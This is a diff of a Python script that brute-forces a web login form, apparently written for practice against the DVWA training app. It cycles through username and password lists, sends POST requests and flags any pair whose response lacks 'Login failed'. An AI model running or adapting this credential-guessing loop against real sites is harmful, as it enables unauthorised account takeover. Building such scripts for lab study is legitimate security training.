@@ -2,7 +2,7 @@ import requests
 import sys
 import validators
 
-#url="http://192.168.1.14/dvwa/login.php"
+
 
 #Using sys library to enter the url as an input
 def get_url():
@@ -38,8 +38,8 @@ for name in userlist:
             }
 
             req=requests.post (input , data = credentials) #creating post requests to send the target
-            print(req.text)
-            if req.text.find("Login failed") == -1: #if in the reply message"Invalid Login is not present , those are the correct credentials
+
+            if req.text.find("Login failed") == -1: #If in the reply message "Login failed" is not present , those are the correct credentials
                 print(f"[+] Correct username is {name} and Correct Password is {passwd}")
                 bol=True
                 break
